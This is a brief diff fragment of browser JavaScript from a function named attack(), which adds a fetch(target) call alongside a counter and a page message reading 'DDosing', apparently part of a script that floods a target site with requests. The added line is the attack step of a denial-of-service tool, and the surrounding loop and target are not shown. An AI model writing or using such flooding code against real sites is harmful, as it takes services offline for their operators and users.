@@ -9,6 +9,7 @@ function attack() {
 	
 	
    dn = dn + 1
+   fetch(target)
    document.body.innerHTML= `DDosing ${dn}`;
    
 
